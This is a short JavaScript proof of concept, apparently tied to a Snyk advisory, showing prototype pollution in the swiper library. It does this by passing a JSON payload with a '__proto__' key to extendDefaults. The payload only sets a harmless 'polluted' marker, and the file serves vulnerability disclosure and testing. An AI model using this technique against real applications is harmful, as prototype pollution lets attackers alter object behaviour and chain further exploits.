//https://snyk.io/vuln/SNYK-JS-SWIPER-1088062
 
  var swiper = require("swiper");
  let obj = {};
  var malicious_payload = '{"__proto__":{"polluted":"yes"}}';

   

  swiper.default.extendDefaults.__x_toTaint = true;
  swiper.default.extendDefaults(JSON.parse(malicious_payload));
// End of file
